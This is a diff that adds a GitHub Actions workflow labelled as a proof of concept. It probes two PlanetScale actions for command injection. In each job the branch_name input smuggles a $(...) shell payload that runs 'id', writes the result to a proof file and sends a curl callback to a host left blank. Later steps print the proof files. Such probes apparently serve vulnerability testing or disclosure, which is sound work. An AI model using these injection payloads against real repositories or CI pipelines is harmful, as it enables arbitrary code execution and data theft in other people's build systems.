@@ -1,0 +1,36 @@
+name: poc2
+on:
+  workflow_dispatch:
+
+jobs:
+  poc-branch-action:
+    runs-on: ubuntu-latest
+    steps:
+      - name: create-branch-action command injection probe
+        uses: planetscale/create-branch-action@allow-duplicates
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'x$(id > /github/workspace/proof_branch.txt; curl -s http:///branch > /dev/null 2>&1; echo INJECTED)end'
+          check_exists: "true"
+      - name: Show proof from branch action
+        run: |
+          echo "--- proof_branch.txt ---"
+          cat proof_branch.txt || echo "no file"
+
+  poc-password-action:
+    runs-on: ubuntu-latest
+    steps:
+      - name: create-branch-password-action command injection probe
+        uses: planetscale/create-branch-password-action@v3
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'y$(id > /github/workspace/proof_pass.txt; curl -s http:///pass > /dev/null 2>&1; echo INJECTED2)end'
+          name: "pocpass"
+      - name: Show proof from password action
+        run: |
+          echo "--- proof_pass.txt ---"
+          cat proof_pass.txt || echo "no file"
